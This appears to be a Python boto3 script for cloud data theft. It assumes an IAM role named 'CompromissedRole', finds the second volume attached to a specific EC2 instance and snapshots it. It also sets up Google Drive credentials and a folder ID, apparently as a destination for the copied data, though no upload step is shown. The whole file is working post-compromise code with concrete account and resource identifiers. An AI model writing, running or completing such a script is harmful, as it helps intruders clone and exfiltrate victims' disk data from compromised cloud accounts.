import boto3

# AWS IAM Role credentials
role_arn = 'arn:aws:iam::833991503211:role/CompromissedRole'
# Google Drive credentials
google_service_account_key = './keys.json'
google_drive_folder_id = '1NzEe7VphjBsAUfhCgYJtYREXq4gXgunY'
# Create AWS session using IAM Role credentials
sts_client = boto3.client('sts')
assumed_role = sts_client.assume_role(RoleArn=role_arn, RoleSessionName='CloneVolumeSession')
credentials = assumed_role['Credentials']


# Connect to EC2 and get the volume ID of the source instance
ec2_client = boto3.client('ec2', region_name='us-west-1', aws_access_key_id=credentials['AccessKeyId'],
                           aws_secret_access_key=credentials['SecretAccessKey'], aws_session_token=credentials['SessionToken'])
instance_id = 'i-00cc33d16e708b9d4'

# Get the list of volumes attached to the instance
response = ec2_client.describe_volumes(Filters=[{'Name': 'attachment.instance-id', 'Values': [instance_id]}])
volumes = response['Volumes']

# Check if there is a second volume attached to the instance
if len(volumes) < 2:
    print('The instance does not have a second volume.')
    exit()

# Get the volume ID of the second volume
volume_id = volumes[1]['VolumeId']

# Create a snapshot of the volume
snapshot_response = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_id = snapshot_response['SnapshotId']

# Wait for the snapshot to be completed
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])
